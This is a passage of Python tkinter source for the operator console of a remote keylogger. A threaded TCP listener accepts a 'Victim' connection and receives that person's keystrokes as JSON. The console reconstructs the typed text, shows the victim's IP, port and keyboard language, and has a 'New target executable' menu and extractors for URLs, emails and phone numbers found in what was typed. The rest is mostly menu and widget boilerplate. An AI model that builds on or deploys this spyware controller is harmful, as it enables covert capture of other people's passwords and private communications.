gaRX3YK6YgdXQvs3q9Q312WfdBwLTMnRo6hZFmjfbfdct4XXPZEp0MRdYaQAoJgosBpBmSR54111h12em1y1osbl+DoGWUJgxQ3IdC5dSN+WLFZZ2m6TNlNqg4j3wgHg61pCk+ybJDncl181oV0PD655ofGXcOOfX36hccUW42VPcavzELQp9sQlaca6fP6CleCPuFm/DhvS5c0q7b3QBm3a5/Pu/u69sagUMnSr6+uvG560y6ytPO80zSaB44w3xrrzC+XU3Ko8+Gk2k6EhdkibA7rtuH34o3qxZBAogCW/AgO/5WsEbMnpw9U1dK+GkO7s1sBSuvDJKGmhT6STsekrzZhwXKKzGV4Jz9K66yvn1rllOOy0a29mx49NjzypAT5hAoADSKl0JXIl1n7G++U6fHi3ocl0J1So68F3lXFp1jELPKadbsrq+vialbHpzZmNqQeDRbkfXzxjQbYTZZitURKm6AnQVuQ4q69x91xVStaKDvrozXFkgSN39k9XsHZtAEfxcYcmS8Lo7v661ynXXSfnLSqqMwaXXjfEJoD5k0KBn5IMPalZY1n3GmuBNM7jee4/7yqlW0TUOHZVX2gork7522yCls9101brr62gSJHRSREmXk8qky07Tfzz8MIECqKewO6AjYGTe164rybVrqtk3WLr+eskvWpRuLUOGg+HGYxTaMmqBsaIwbYyu+Ym5pqmvW3u7eI89RqAAGsW/917xtm5NvBah6puxrkyeP1+kf3/3FVeVUvgfR4o3caL4uriuymrq8gqrYS0KPaaNG0Uef1zklFOcX6+qRRdvam6rspZrUeouu44V6a6fG6BHCremDCpK283ujdcD6PRITY+hs2BcV2bViqbg0DGdzZtFgkqpksz62msF6OIKcT2mVticSdffvPFGxUkEqdevbN8u3owZBArAtcKiRdEaCgOJ+to3bRKZNEnkvPPcV2zVSq9eYbbTsCutLJtvPabHdqH34PnnRdraRH79a/fXo1bRSQMrVsR2N5VKHGB1HcaGDQSJ7uSuc8/+nOtjQDrSv/+x5TOFuj67fuK3w7Cy3btXvOHD3VdypkUDx4IFUtBcS/WaHqtJG596qjXGIopFj7VClt8u9zzF9FifQeyWd9fpPyA2dFdhMrySjXeKspxiqqtt/SlTopQPris+w6J7VXv9+0vuwQfF12u0ZInIypU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"
app_icon = PhotoImage(data=app_icon_data)
background = PhotoImage(data=icon_data)
Label(Connection_Frame, image=background).pack(side='left', pady=10, padx=10)
app.iconphoto(False, app_icon)

class Holded:
    shift = False

def bytes_size(num, suffix="B"):
    for unit in ["", "K", "M", "G", "T", "P", "E", "Z"]:
        if abs(num) < 1024.0:
            return f"{num:3.3f}{unit}{suffix}"
        num /= 1024.0
    return f"{num:.1f}Yi{suffix}"


def Start_connection():
    if _IP_.get() and _PORT_.get():
        # sent = 0

        style.configure("Listen.TButton", foreground='#e7b3a5')
        Listen_btn.config(text='Listening', command='')
        _IP_.config(state='disabled', cursor='')
        _PORT_.config(state='disabled', cursor='')
        HOST = str(_IP_.get())
        PORT = int(_PORT_.get())

        def RECEIVE():
            global data

            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # tcp protocol
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((HOST, PORT))
            server_socket.listen(1)
            (server_connection, (ip, port)) = server_socket.accept()

            ############# After connected:
            Connected_client_ip.config(text=str(ip))
            Connected_client_port.config(text=str(port))
            Connected_at_lbl.config(text=datetime.datetime.now().strftime("%I:%M:%S %p"))

            style.configure("Listen.TButton", foreground='red')
            Listen_btn.config(text='Connected', cursor='hand2')
            ToolTip(Listen_btn, "Restart the listener to change target (:")

            received = 0
            while True:
                try:
                    dict_data = json.loads(server_connection.recv(1024).decode())
                    received += len(dict_data)
                    Connection_received_data.config(text='Recv: ' + bytes_size(received))
                    if KD.isKey(dict_data['key']):
                        if dict_data['key'] == 'Key.space':
                            if dict_data['action'] == 'Press':
                                data += ' '
                                Insert_Simulator(' ')
                            Keystroke_insert(key=KD.button(dict_data['key']), action=dict_data['action'], for_=dict_data['for'], keyboard_language=dict_data['language'])
                        else:# if dict_data['action'] == 'Press':
                            if dict_data['key'] == 'Key.enter':
                                if dict_data['action'] == 'Press':
                                    Insert_Simulator('\n')
                            Keystroke_insert(key=KD.button(dict_data['key']), action=dict_data['action'], for_=dict_data['for'], keyboard_language=dict_data['language'])
                            if len(dict_data['key']) == 1:
                                if dict_data['action'] == 'Press':
                                    data += dict_data['key']
                                    Insert_Simulator(str(KD.button(dict_data['key'])))
                    else:
                        Keystroke_insert(key=KD.button(dict_data['key']), action=dict_data['action'], for_=dict_data['for'], keyboard_language=dict_data['language'])
                    print(len(dict_data), type(dict_data), dict_data)
                except (ValueError, json.decoder.JSONDecodeError) as s:
                    continue
                except (OSError, ConnectionResetError, ConnectionAbortedError, ConnectionError, ConnectionRefusedError):
                    server_socket.close()
                    server_connection.close()
                    style.configure("Listen.TButton", foreground='green')
                    Listen_btn.config(text='Listen', command=lambda: threading.Thread(target=Start_connection).start())
                    _IP_.config(state='normal', cursor='xterm')
                    _PORT_.config(state='normal', cursor='xterm')
                    Connected_client_ip.config(text='***.***.***.***')
                    Connected_client_port.config(text='*****')
                    Connection_received_data.config(text='Recv: 0')
                    Connected_at_lbl.config(text='**:**:** **')
                    Target_keyboardLanguage_lbl.config(text='???')
                    break

                def CLOSE():
                    server_socket.close()
                    server_connection.close()
                    style.configure("Listen.TButton", foreground='green')
                    Listen_btn.config(text='Listen', command=lambda: threading.Thread(target=Start_connection).start())
                    _IP_.config(state='normal', cursor='xterm')
                    _PORT_.config(state='normal', cursor='xterm')
                    Connected_client_ip.config(text='***.***.***.***')
                    Connected_client_port.config(text='*****')
                    Connection_received_data.config(text='Recv: 0')
                    Connected_at_lbl.config(text='**:**:** **')
                    Target_keyboardLanguage_lbl.config(text='???')
                Listen_btn.config(command=lambda :CLOSE())

        threading.Thread(target=RECEIVE).start()
Listen_btn = Button(Connection_Frame, style="Listen.TButton", text='Listen', takefocus=False, cursor='hand2', command=lambda :threading.Thread(target=Start_connection).start())
Listen_btn.pack(side='right', padx=5, pady=5)

def port_VALIDATOR(event):
    # IR = IP REGEX
    IR = re.compile('(^\d{0,5}$)')
    if IR.match(event):
        return True
    else:
        return False
register_port = app.register(port_VALIDATOR)
_PORT_ = Entry(Connection_Frame, width=5, validate="key", validatecommand=(register_port, '%P'))
_PORT_.pack(side='right', fill='x')
_PORT_.insert(0, str(random.randint(1, 65535)))
Label(Connection_Frame, text=':').pack(side='right')

def IP_VALIDATOR(event):
    # IR = IP REGEX
    IR = re.compile('(^\d{0,3}$|^\d{1,3}\.\d{0,3}$|^\d{1,3}\.\d{1,3}\.\d{0,3}$|^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{0,3}$)')
    if IR.match(event):
        return True
    else:
        return False
register_ip = app.register(IP_VALIDATOR)
_IP_ = Entry(Connection_Frame, width=14, validate="key", validatecommand=(register_ip, '%P'))
_IP_.pack(side='right', fill='x')
_IP_.insert(0, socket.gethostbyname(socket.gethostname()))

Label(Connection_Frame, text='Victim informations: ').pack(side='left')
Connected_client_ip = Label(Connection_Frame, text='***.***.***.***', cursor='hand2')
ToolTip(Connected_client_ip, "Target ip")
Connected_client_ip.pack(side='left')
Connected_client_ip.bind('<Enter>', lambda a:Connected_client_ip.config(background='#a5d9e7'), add='+')
Connected_client_ip.bind('<Leave>', lambda a:Connected_client_ip.config(background=''), add='+')
Connected_client_ip.bind('<Button-1>', lambda a:PYcopy(Connected_client_ip['text']), add='+')

Label(Connection_Frame, text=':').pack(side='left')
Connected_client_port = Label(Connection_Frame, text='*****', cursor='hand2')
ToolTip(Connected_client_port, "and port")
Connected_client_port.pack(side='left')
Connected_client_port.bind('<Enter>', lambda a:Connected_client_port.config(background='#d4a5e7'), add='+')
Connected_client_port.bind('<Leave>', lambda a:Connected_client_port.config(background=''), add='+')
Connected_client_port.bind('<Button-1>', lambda a:PYcopy(Connected_client_port['text']), add='+')

Target_keyboardLanguage_lbl = Label(Connection_Frame, text='???', cursor='hand2')
ToolTip(Target_keyboardLanguage_lbl, "Target keyboard language")
Target_keyboardLanguage_lbl.pack(side='left', padx=25)
Target_keyboardLanguage_lbl.bind('<Enter>', lambda a:Target_keyboardLanguage_lbl.config(background='yellow'), add='+')
Target_keyboardLanguage_lbl.bind('<Leave>', lambda a:Target_keyboardLanguage_lbl.config(background=''), add='+')
Target_keyboardLanguage_lbl.bind('<Button-1>', lambda a:PYcopy(Target_keyboardLanguage_lbl['text']), add='+')

Connection_received_data = Label(Connection_Frame, text='Recv: 0', cursor='hand2')
ToolTip(Connection_received_data, "How much data received (using TCP)")
Connection_received_data.pack(side='left')
Connection_received_data.bind('<Enter>', lambda a:Connection_received_data.config(background='red', foreground='white'), add='+')
Connection_received_data.bind('<Leave>', lambda a:Connection_received_data.config(background='', foreground='black'), add='+')
Connection_received_data.bind('<Button-1>', lambda a:PYcopy(Connection_received_data['text']), add='+')

Connected_at_lbl = Label(Connection_Frame, text='**:**:** **', cursor='hand2')
ToolTip(Connected_at_lbl, "Connection established on")
Connected_at_lbl.pack(side='left', padx=25)
Connected_at_lbl.bind('<Enter>', lambda a:Connected_at_lbl.config(background='pink'), add='+')
Connected_at_lbl.bind('<Leave>', lambda a:Connected_at_lbl.config(background=''), add='+')
Connected_at_lbl.bind('<Button-1>', lambda a:PYcopy(Connected_at_lbl['text']), add='+')

# Theme (light/dark)?
# style = Style()
# style.configure(".", background='black', foreground='white')
# style.configure("TButton", background='black', foreground='white')

# get keyboard information (ALL OF IT (:)

new_icon = PhotoImage(data=ICONS['new'])
export_icon = PhotoImage(data=ICONS['export'])
plaintext_icon = PhotoImage(data=ICONS['plaintext'])
json_icon = PhotoImage(data=ICONS['json'])
xml_icon = PhotoImage(data=ICONS['xml'])
csv_icon = PhotoImage(data=ICONS['csv'])
report_icon = PhotoImage(data=ICONS['report'])
refresh_icon = PhotoImage(data=ICONS['refresh'])
hide_icon = PhotoImage(data=ICONS['hide'])
purge_icon = PhotoImage(data=ICONS['purge'])
main_icon = PhotoImage(data=ICONS['main'])
extractors_icon = PhotoImage(data=ICONS['extractors'])
simulators_icon = PhotoImage(data=ICONS['simulators'])
tools_icon = PhotoImage(data=ICONS['tools'])
todo_icon = PhotoImage(data=ICONS['todo'])
debugger_icon = PhotoImage(data=ICONS['debugger'])
keyboard_icon = PhotoImage(data=ICONS['keyboard_map'])
appearance_icon = PhotoImage(data=ICONS['appearance'])
theme_icon = PhotoImage(data=ICONS['theme'])
light_theme_icon = PhotoImage(data=ICONS['light'])
dark_theme_icon = PhotoImage(data=ICONS['dark'])
search_icon = PhotoImage(data=ICONS['search'])
advance_search_icon = PhotoImage(data=ICONS['advance_search'])
top_icon = PhotoImage(data=ICONS['top'])
minimize_icon = PhotoImage(data=ICONS['minimize'])
maximize_icon = PhotoImage(data=ICONS['maximize'])
secure_icon = PhotoImage(data=ICONS['secure'])
exit_icon = PhotoImage(data=ICONS['exit'])
about_icon = PhotoImage(data=ICONS['about'])
faq_icon = PhotoImage(data=ICONS['faq'])
update_icon = PhotoImage(data=ICONS['update'])
navbar = Menu(app)
File_menu = Menu(navbar, tearoff=0)
Export_menu = Menu(navbar, tearoff=0)
Report_menu = Menu(navbar, tearoff=0)
Edit_menu = Menu(navbar, tearoff=0)
View_menu = Menu(navbar, tearoff=0)
Main_view_menu = Menu(navbar, tearoff=0)
Extractors_view_menu = Menu(navbar, tearoff=0)
Simulators_view_menu = Menu(navbar, tearoff=0)
Tools_view_menu = Menu(navbar, tearoff=0)
appearance_view_menu = Menu(navbar, tearoff=0)
theme_appearance_view_menu = Menu(navbar, tearoff=0)
Navigate_menu = Menu(navbar, tearoff=0)
Search_menu = Menu(navbar, tearoff=0)
Action_menu = Menu(navbar, tearoff=0)
Help_menu = Menu(navbar, tearoff=0)

def Show_Hide_Window_widgets():
    if HideVar.get():
        Main_Frame.pack_forget()
    else:
        Main_Frame.pack(fill='both', expand=True)
def Show_Hide_Url_extractor():
    if not Extractors_urlVAR.get():
        urls_list_labelframe.pack_forget()
    else:
        urls_list_labelframe.pack(side='left', expand=True, fill='both')
        if Extractors_emailVAR.get():
            emails_list_frame.pack_forget()
            emails_list_frame.pack(side='left', expand=True, fill='both')
        if Extractors_phoneVAR.get():
            phonenumbers_list_frame.pack_forget()
            phonenumbers_list_frame.pack(side='left', expand=True, fill='both')
def Show_Hide_Email_extractor():
    if Extractors_urlVAR.get():
        emails_list_frame.pack_forget()
        emails_list_frame.pack(side='left', expand=True, fill='both')
    if not Extractors_emailVAR.get():
        emails_list_frame.pack_forget()
    else:
        emails_list_frame.pack(side='left', expand=True, fill='both')
    if Extractors_phoneVAR.get():
        phonenumbers_list_frame.pack_forget()
        phonenumbers_list_frame.pack(side='left', expand=True, fill='both')
def Show_Hide_Phone_extractor():
    if Extractors_urlVAR.get():
        emails_list_frame.pack_forget()
        emails_list_frame.pack(side='left', expand=True, fill='both')
    if Extractors_emailVAR.get():
        emails_list_frame.pack_forget()
        emails_list_frame.pack(side='left', expand=True, fill='both')
    if not Extractors_phoneVAR.get():
        phonenumbers_list_frame.pack_forget()
    else:
        phonenumbers_list_frame.pack(side='left', expand=True, fill='both')
def Show_Hide_KeyboardkeysTable():
    if not Tools_KeyboardkeysVar.get():
        Keys_Table.pack_forget()
    else:
        Keys_Table.pack(side='bottom', expand=True, fill='both')


# (START)######## FILE #############
navbar.add_cascade(label="File", menu=File_menu)
########## FILE > NEW #############
File_menu.add_command(label='New', compound='left', command=lambda :New_Target(), image=new_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='New target executable', hidemargin=False)
########## FILE > EXPORT ##########
File_menu.add_cascade(label='Export', state='disabled', compound='left', menu=Export_menu, image=export_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', hidemargin=False)
########## FILE > EXPORT > PLAINTEXT ##########
Export_menu.add_command(label='Plaintext', compound='left', image=plaintext_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='New listener', hidemargin=False)
########## FILE > EXPORT > JSON ##########
Export_menu.add_command(label='JSON', compound='left', image=json_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='New listener', hidemargin=False)
########## FILE > EXPORT > XML ##########
Export_menu.add_command(label='XML', compound='left', image=xml_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='New listener', hidemargin=False)
########## FILE > EXPORT > CSV ##########
Export_menu.add_command(label='CSV', compound='left', image=csv_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='New listener', hidemargin=False)
########## FILE > REPORT ##########
File_menu.add_cascade(label='Report', state='disabled', menu=Report_menu, compound='left', image=report_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', hidemargin=False)
########## FILE > REPORT > PLAINTEXT ##########
Report_menu.add_command(label='Plaintext', compound='left', image=plaintext_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='New listener', hidemargin=False)
########## FILE > REPORT > JSON ##########
Report_menu.add_command(label='JSON', compound='left', image=json_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='New listener', hidemargin=False)
########## FILE > REPORT > XML ##########
Report_menu.add_command(label='XML', compound='left', image=xml_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='New listener', hidemargin=False)
########## FILE > REPORT > CSV ##########
Report_menu.add_command(label='CSV', compound='left', image=csv_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='New listener', hidemargin=False)
########## EDIT #####################
navbar.add_cascade(label="Edit", menu=Edit_menu)
########## EDIT > REFRESH ###########
Edit_menu.add_command(label='Refresh', command=lambda: app.update_idletasks(), compound='left', image=refresh_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Refresh the software window', hidemargin=False)
########## EDIT > HIDE ##############
HideVar = BooleanVar(value=False)
Edit_menu.add_checkbutton(label='Hide', variable=HideVar, compound='left', image=hide_icon, columnbreak=0, activeforeground='#2c2c2c',   foreground='black', activebackground='#e2e2e2', accelerator='Hide the software window',   hidemargin=False, command=lambda :Show_Hide_Window_widgets())
########## EDIT > PURGE #############
Edit_menu.add_command(label='Purge', state='disabled', compound='left', image=purge_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Purge all data and reset listener', hidemargin=False)
########## VIEW ##################################
navbar.add_cascade(label="View", menu=View_menu)
########## VIEW > MAIN ###########################
View_menu.add_cascade(label='Main', state='disabled', menu=Main_view_menu, compound='left', image=main_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', hidemargin=False)
########## VIEW > MAIN > KEYBOARD ################
Main_view_menu.add_checkbutton(label='Keyboard', state='disabled', compound='left', image=main_icon, columnbreak=0,        activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2',        accelerator='Exit the software', hidemargin=False)
########## VIEW > EXTRACTORS #####################
View_menu.add_cascade(label='Extractors', menu=Extractors_view_menu, compound='left', image=extractors_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', hidemargin=False)
########## VIEW > EXTRACTORS > URL ###############
Extractors_urlVAR = BooleanVar(value=True)
Extractors_emailVAR = BooleanVar(value=True)
Extractors_phoneVAR = BooleanVar(value=True)
Extractors_view_menu.add_checkbutton(label='Url', variable=Extractors_urlVAR, compound='left', image=extractors_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Show/Hide url extractor', hidemargin=False, command=lambda :Show_Hide_Url_extractor())
########## VIEW > EXTRACTORS > EMAIL #############
Extractors_view_menu.add_checkbutton(label='Email', variable=Extractors_emailVAR, compound='left', image=extractors_icon, columnbreak=0,              activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2',              accelerator='Show/Hide email extractor', hidemargin=False, command=lambda :Show_Hide_Email_extractor())
########## VIEW > EXTRACTORS > PHONE #############
Extractors_view_menu.add_checkbutton(label='Phone number', variable=Extractors_phoneVAR, compound='left', image=extractors_icon, columnbreak=0,              activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2',              accelerator='Show/Hide phone-number extractor', hidemargin=False, command=lambda :Show_Hide_Phone_extractor())
########## VIEW > SIMULATORS #####################
View_menu.add_cascade(label='Simulators', state='disabled', menu=Simulators_view_menu, compound='left', image=simulators_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', hidemargin=False)
########## VIEW > SIMULATORS > KEYBOARD ##########
Simulators_view_menu.add_checkbutton(label='Keyboard', compound='left', image=simulators_icon, columnbreak=0,              activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Exit the software', hidemargin=False)
########## VIEW > TOOLS ##########
View_menu.add_cascade(label='Tools', menu=Tools_view_menu, compound='left', image=tools_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', hidemargin=False)
########## VIEW > TOOLS > TODO ##########
Tools_view_menu.add_checkbutton(label='Todo', state='disabled', compound='left', image=todo_icon, columnbreak=0,         activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2',         accelerator='Todo tasks', hidemargin=False)
########## VIEW > TOOLS > DEBUGGER ##########
Debugger_frame = LabelFrame(app, text='Debugger')
Debugger_SB_Y = Scrollbar(Debugger_frame, orient='vertical')
Debugger_SB_Y.pack(side='right', fill='y')
Debugger = Text(Debugger_frame, height=10, tabstyle='wordprocessor', tabs=4, undo=True, autoseparators=True, blockcursor=True, inactiveselectbackground='red', maxundo=-1, wrap='word', yscrollcommand=Debugger_SB_Y.set)
def Debugger_insert(text):
    Debugger.insert(1.0, str(text) + '\n')
Debugger_SB_Y.config(command=Debugger.yview)
Debugger.pack(fill='both', expand=True)
def redo(textbox:Text):
    try:textbox.edit_redo()
    except _tkinter.TclError:pass
Debugger.bind('<Control-Z>', lambda a:redo(Debugger))

isDebuggerVar = BooleanVar(value=False)
def Show_Hide_Debugger():
    if not isDebuggerVar.get():
        Debugger_frame.pack_forget()
    else:
        Debugger_frame.pack(side='bottom', fill='x')
Tools_view_menu.add_checkbutton(label='Debugger', state='disabled', compound='left', variable=isDebuggerVar, image=debugger_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='software debugger', hidemargin=False, command=lambda :Show_Hide_Debugger())
########## VIEW > TOOLS > KEYBOARD-MAP ##########
Tools_KeyboardkeysVar = BooleanVar(value=False)
Tools_view_menu.add_checkbutton(label='Keyboard', compound='left', image=keyboard_icon, variable=Tools_KeyboardkeysVar, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Keyboard keys', hidemargin=False, command=lambda :Show_Hide_KeyboardkeysTable())
########## VIEW > APPEARANCE ##########
View_menu.add_cascade(label='Appearance', state='disabled', menu=appearance_view_menu, compound='left', image=appearance_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', hidemargin=False)
########## VIEW > APPEARANCE > THEME ##########
appearance_view_menu.add_cascade(label='Theme', state='disabled', menu=theme_appearance_view_menu, compound='left',          image=theme_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black',          activebackground='#e2e2e2', hidemargin=False)
########## VIEW > APPEARANCE > THEME > LIGHT ##########
theme_appearance_view_menu.add_radiobutton(label='Light', state='disabled', compound='left', image=light_theme_icon,                    columnbreak=0, activeforeground='#2c2c2c', foreground='black',                    activebackground='#e2e2e2', accelerator='Exit the software',                    hidemargin=False)
########## VIEW > APPEARANCE > THEME > DARK ##########
theme_appearance_view_menu.add_radiobutton(label='Dark', state='disabled', compound='left', image=dark_theme_icon,                    columnbreak=0, activeforeground='#2c2c2c', foreground='black',                    activebackground='#e2e2e2', accelerator='Exit the software',                    hidemargin=False)
########## NAVIGATE ##########
navbar.add_cascade(label="Navigate", state='disabled', menu=Navigate_menu, underline=True)
########## NAVIGATE > SEARCH ##########
Navigate_menu.add_cascade(label='Search', state='disabled', menu=Search_menu, compound='left', image=search_icon, columnbreak=0,   activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2',   hidemargin=False)
########## NAVIGATE > KEYBOARD ##########
Search_menu.add_command(label='Keyboard', state='disabled', compound='left', image=search_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Search in the keyboard table', hidemargin=False)
########## NAVIGATE > URL ##########
Search_menu.add_command(label='Url', state='disabled', compound='left', image=search_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Search in the url extractor', hidemargin=False)
########## NAVIGATE > EMAIL ##########
Search_menu.add_command(label='Email', state='disabled', compound='left', image=search_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Search in the email extractor', hidemargin=False)
########## NAVIGATE > PHONE-NUMBER ##########
Search_menu.add_command(label='Phone number', state='disabled', compound='left', image=search_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Search in the phone-number extractor', hidemargin=False)
########## NAVIGATE > SIMULATOR ##########
Search_menu.add_command(label='Simulator', state='disabled', compound='left', image=search_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Search in the keyboard simulator', hidemargin=False)
########## NAVIGATE > ADVANCE ##########
Search_menu.add_command(label='Advance', state='disabled', compound='left', image=advance_search_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Search everywhere', hidemargin=False)
# (END)#########################

########## ACTION ##########
navbar.add_cascade(label="Action",  menu=Action_menu)
########## Action > TOP ##########
isTopWindowVar = BooleanVar(value=False)
def TopWindow():
    if app.attributes('-topmost'):
        app.attributes('-topmost', False)
        isTopWindowVar.set(False)
    else:
        app.attributes('-topmost', True)
Action_menu.add_radiobutton(label='Top', variable=isTopWindowVar, compound='left', image=top_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Top overall windows', hidemargin=False, command=lambda :TopWindow())
########## Action > MINIMIZE ##########
def Minimize():
    app.iconify()
Action_menu.add_command(label='Minimize', compound='left', image=minimize_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Minimize window', hidemargin=False, command=lambda :Minimize())
########## Action > MAXIMIZE ##########
def Maximize():
    if app.attributes('-fullscreen'):
        app.attributes('-fullscreen', False)
    else:
        app.attributes('-fullscreen', True)
Action_menu.add_command(label='Maximize', compound='left', image=maximize_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Maximize window', hidemargin=False, command=lambda :Maximize())
########## Action > SECURE ##########
def do_Secure():
    secure_password = str(random.randint(1000, 9999))
    answer = askyesno(title="Secure?", message="if you sure, then this is your password: " + secure_password)
    if answer:
        Securer.Securer(app, password=secure_password)
